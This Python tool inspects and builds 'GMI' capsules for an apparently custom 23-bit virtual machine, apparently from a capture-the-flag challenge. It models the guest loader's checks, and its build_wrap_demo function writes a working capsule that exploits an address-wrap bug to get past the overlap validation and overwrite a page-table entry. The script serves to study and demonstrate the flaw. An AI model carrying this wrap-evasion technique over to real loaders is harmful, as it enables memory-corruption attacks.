#!/usr/bin/env python3
"""Inspect and build ICXX GMI capsules.

GMI files are arrays of little-endian 23-bit words.  The checksum is salted
with the three-word build id and skips header word 10 (the checksum field).
This also contains a small model of the two guest-side validation passes and
the segment mapper, useful for demonstrating the 23-bit wrap bug.
"""
from __future__ import annotations

import argparse
from dataclasses import dataclass
from pathlib import Path

MASK = 0x7FFFFF
MAGIC = 0x494D47
BUILD_ID = (0x6A2462, 0x235DA1, 0x022C04)


def add23(a: int, b: int) -> int:
    return (a + b) & MASK


def mix(a: int, b: int) -> int:
    return (((a ^ b) * 0x45D9F3) + 0x494D) & MASK


def checksum(words: list[int], salt=BUILD_ID) -> int:
    state = MAGIC
    for value in salt:
        state = mix(state, value)
    for i, value in enumerate(words):
        if i != 10:
            state = mix(state, value)
    return state or 1


def read_words(path: Path) -> list[int]:
    raw = path.read_bytes()
    if len(raw) % 3:
        raise ValueError("GMI length is not divisible by three")
    return [int.from_bytes(raw[i:i + 3], "little") & MASK
            for i in range(0, len(raw), 3)]


def write_words(path: Path, words: list[int]) -> None:
    path.write_bytes(b"".join((x & MASK).to_bytes(3, "little") for x in words))


@dataclass
class Segment:
    fileoff: int
    filelen: int
    vaddr: int
    memlen: int
    flags: int

    @property
    def end23(self) -> int:
        return add23(self.vaddr, self.memlen)


def segments(words: list[int]) -> list[Segment]:
    return [Segment(*words[12 + 5 * i:17 + 5 * i]) for i in range(words[5])]


def validate_like_guest(words: list[int], salt=BUILD_ID) -> list[Segment]:
    """Model the relevant checks in guest functions 0x15b97 and 0x1452d."""
    assert len(words) >= 17
    assert words[0] == MAGIC and words[1] == 1
    assert tuple(words[2:5]) == tuple(salt)
    count, entry = words[5], words[6]
    assert 1 <= count <= 8
    # A zero capability mask is valid as well; the loader simply skips the
    # capability-acquisition loop in that case.
    assert words[7] == 0 and words[8] in (0, 1)
    assert words[9] == 0x6FFB00 and words[11] == 0
    assert 12 + 5 * count <= len(words)
    assert words[10] == checksum(words, salt)
    segs = segments(words)
    found_entry = False
    for s in segs:
        assert 1 <= s.memlen <= 0x10000
        assert s.filelen <= s.memlen
        assert s.fileoff + s.filelen <= len(words)
        assert s.flags in (5, 7, 13)
        # Vulnerability: ADD is a 23-bit instruction, so this can wrap.
        assert s.end23 <= 0x6F0000
        if s.flags == 13 and s.vaddr <= entry < s.end23:
            found_entry = True
    assert found_entry
    # Redundant EXP validation uses the same wrapped intervals.
    for i, a in enumerate(segs):
        for j, b in enumerate(segs):
            if i != j:
                assert not (a.vaddr < b.end23 and b.vaddr < a.end23)
    return segs


def mapped_pages_like_guest(segs: list[Segment]) -> list[tuple[int, int, int, bool]]:
    """Model mapper 0x148a0, including its refusal to replace an existing PTE."""
    result = []
    occupied = set()
    for si, s in enumerate(segs):
        offset = 0
        while offset < s.memlen:
            page = add23(s.vaddr, offset) & 0x7FFF00
            ok = page not in occupied
            result.append((si, offset, page, ok))
            if not ok:
                return result
            occupied.add(page)
            offset += 0x100
    return result


def build_wrap_demo() -> list[int]:
    # Segment 0 makes entry 0 valid.  Segment 1 starts at 0x7fff00 and has
    # two pages; the mapper's second 23-bit vaddr addition becomes zero and
    # replaces segment 0's page-table entry.  Wrapped intervals evade the
    # pairwise overlap check.
    count = 2
    header_words = 12 + 5 * count
    seg0_data = [0x120000]                 # HALT
    seg1_data = [0] * 0x100 + [0x120000] + [0] * 0xFF
    off0 = header_words
    off1 = off0 + len(seg0_data)
    words = [MAGIC, 1, *BUILD_ID, count, 0, 0, 1, 0x6FFB00, 0, 0]
    words += [off0, len(seg0_data), 0, 0x100, 13]
    words += [off1, len(seg1_data), 0x7FFF00, 0x200, 13]
    words += seg0_data + seg1_data
    words[10] = checksum(words)
    validate_like_guest(words)
    return words


def describe(words: list[int]) -> None:
    print(f"words={len(words):#x} checksum={words[10]:#x} computed={checksum(words):#x}")
    for i, s in enumerate(segments(words)):
        print(f"seg{i}: file={s.fileoff:#x}+{s.filelen:#x} "
              f"virtual={s.vaddr:#x}+{s.memlen:#x} end23={s.end23:#x} flags={s.flags:#x}")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("path", nargs="?", type=Path)
    ap.add_argument("--make-wrap-demo", type=Path)
    args = ap.parse_args()
    if args.make_wrap_demo:
        words = build_wrap_demo()
        write_words(args.make_wrap_demo, words)
        describe(words)
        print("mapper calls:")
        for si, off, page, ok in mapped_pages_like_guest(validate_like_guest(words)):
            print(f"  seg{si} offset={off:#x} -> virtual_page={page:#x} "
                  f"mapper={'PASS' if ok else 'FAIL(existing PTE)' }")
    if args.path:
        words = read_words(args.path)
        describe(words)
        validate_like_guest(words)
        print("guest validation model: PASS")


if __name__ == "__main__":
    main()
